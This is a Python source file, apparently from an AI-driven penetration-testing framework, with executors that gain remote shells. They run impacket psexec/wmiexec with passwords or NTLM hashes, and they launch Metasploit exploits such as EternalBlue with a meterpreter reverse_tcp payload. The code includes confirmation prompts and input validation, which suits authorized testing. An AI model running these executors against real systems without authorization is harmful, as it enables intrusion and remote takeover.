"""
getshell 专项执行器

- ImpacketExecExecutor：调用 impacket 的 psexec/wmiexec/smbexec 脚本远程执行命令
- MSFGetShellExecutor：调用 Metasploit msfconsole 的 exploit 模块建立会话（可选）
"""
import logging
import re
import shutil
import sys
from typing import List, Dict, Optional

from core.executors.base import ToolExecutor

logger = logging.getLogger(__name__)

# msf 模块/payload 名与地址的严格白名单字符集（防 resource 脚本注入）
_MSF_NAME_RE = re.compile(r"^[A-Za-z0-9_./-]+$")
_IP_RE = re.compile(r"^[0-9a-fA-F:.]+$")
_PORT_RE = re.compile(r"^[0-9]{1,5}$")


class ImpacketExecExecutor(ToolExecutor):
    """impacket 远程命令执行（psexec / wmiexec / smbexec / atexec）"""

    METHODS = ("wmiexec.py", "psexec.py", "smbexec.py", "atexec.py")

    def __init__(
        self,
        method: str = "wmiexec.py",
        timeout: int = 300,
        require_confirmation: bool = True,
        whitelist=None,
        allow_all: bool = False,
        confirm_callback=None,
    ):
        if method not in self.METHODS:
            raise ValueError(f"不支持的 impacket 脚本: {method}")
        super().__init__(
            tool_name=method,
            timeout=timeout,
            require_confirmation=require_confirmation,
            whitelist=whitelist,
            allow_all=allow_all,
            confirm_callback=confirm_callback,
        )
        self.method = method

    def build_command(self, step_input, step_config) -> Optional[List[str]]:
        host = self._extract_host(step_input.target)
        if not host or not self._validate_host(host):
            return None

        creds = step_input.credentials or {}
        username = creds.get("username") or step_config.get("username") or "administrator"
        password = creds.get("password") or step_config.get("password") or ""
        hashes = creds.get("hashes") or step_config.get("hashes") or ""
        domain = creds.get("domain") or step_config.get("domain") or ""
        command = step_config.get("command") or "whoami"

        # AI 可用 tool 字段指定具体 impacket 脚本（wmiexec/psexec/smbexec/atexec），
        # 非法值回退默认方法。
        method = step_config.get("tool") or self.method
        if method not in self.METHODS:
            method = self.method

        user_at = f"{domain}/{username}" if domain else username
        # impacket 脚本（wmiexec.py 等）是 Python 源码而非 exe，Windows 上直接
        # subprocess 执行会报 WinError 193（%1 不是有效的 Win32 应用程序），
        # 必须用当前解释器执行脚本全路径。
        script = shutil.which(method)
        if not script:
            return None
        cmd = [sys.executable, script]
        if hashes:
            # 优先用 NTLM 哈希认证，避免明文密码进命令行
            cmd += ["-hashes", hashes]
            target = f"{user_at}@{host}"
        elif password:
            target = f"{user_at}:{password}@{host}"
        else:
            target = f"{user_at}@{host}"
        cmd += [target, command]
        return cmd


class MSFGetShellExecutor(ToolExecutor):
    """Metasploit msfconsole 建立会话（依赖 Metasploit；本机无 msfconsole 时回退 Docker 镜像）"""

    DOCKER_IMAGE = "metasploitframework/metasploit-framework"

    def __init__(
        self,
        exploit: str = "exploit/multi/handler",
        payload: str = "windows/meterpreter/reverse_tcp",
        lhost: str = None,
        lport: int = 4444,
        image: str = None,
        timeout: int = 600,
        require_confirmation: bool = True,
        whitelist=None,
        allow_all: bool = False,
        confirm_callback=None,
    ):
        super().__init__(
            tool_name="msfconsole",
            timeout=timeout,
            require_confirmation=require_confirmation,
            whitelist=whitelist,
            allow_all=allow_all,
            confirm_callback=confirm_callback,
        )
        self.exploit = exploit
        self.payload = payload
        self.lhost = lhost
        self.lport = lport
        self.image = image or self.DOCKER_IMAGE

    def _tool_available(self, tool: str = None) -> bool:
        # 本机有 msfconsole 直接用；否则有 docker 就用容器里的 msfconsole
        return shutil.which("msfconsole") is not None or shutil.which("docker") is not None

    def build_command(self, step_input, step_config) -> Optional[List[str]]:
        host = self._extract_host(step_input.target)
        if not host or not self._validate_host(host):
            return None

        # AI 可用 tool 字段指定具体 MSF 模块名（如 exploit/windows/smb/ms17_010_eternalblue）
        exploit = step_config.get("tool") or step_config.get("exploit") or self.exploit
        lhost = step_config.get("lhost") or self.lhost or "127.0.0.1"
        lport = str(step_config.get("lport") or self.lport)

        # 严格校验，防止 msfconsole resource 脚本注入
        if not _MSF_NAME_RE.fullmatch(exploit):
            logger.warning("非法 exploit 模块名: %r", exploit)
            return None
        if not _IP_RE.fullmatch(lhost):
            logger.warning("非法 LHOST: %r", lhost)
            return None
        if not _PORT_RE.fullmatch(lport) or not (1 <= int(lport) <= 65535):
            logger.warning("非法 LPORT: %r", lport)
            return None

        # payload 名只取构造参数/默认值（windows/meterpreter/reverse_tcp）。
        # 绝不使用 AI 返回的 step["payload"]：规划 prompt 已声明它是「示例、
        # 不执行、仅分析」的自由文本，AI 可能填一整段 msfconsole 脚本，
        # 直接 set PAYLOAD 会被白名单拒绝（非法 payload 名）。
        payload = self.payload
        if not _MSF_NAME_RE.fullmatch(payload):
            logger.warning("非法 payload 名: %r", payload)
            return None

        # 目标地址：容器模式下 127.0.0.1/localhost 指向容器自身，映射到宿主机
        use_docker = shutil.which("msfconsole") is None and shutil.which("docker") is not None
        rhosts = host
        if use_docker and host in ("127.0.0.1", "localhost"):
            rhosts = "host.docker.internal"

        # exploit 模块走 exploit 命令并设置 PAYLOAD；auxiliary/post 模块没有
        # PAYLOAD 概念，scanner 之类用 run（AI 有时误选 scanner 模块）。
        msf_cmds = [f"use {exploit}", f"set RHOSTS {rhosts}"]
        if exploit.startswith("exploit/"):
            msf_cmds += [
                f"set PAYLOAD {payload}",
                f"set LHOST {lhost}",
                f"set LPORT {lport}",
                "exploit -z",
            ]
        else:
            msf_cmds.append("run")
        msf_cmds.append("exit")

        if use_docker:
            return ["docker", "run", "--rm", "-i", self.image, "./msfconsole", "-q", "-x", "; ".join(msf_cmds)]
        return ["msfconsole", "-q", "-x", "; ".join(msf_cmds)]
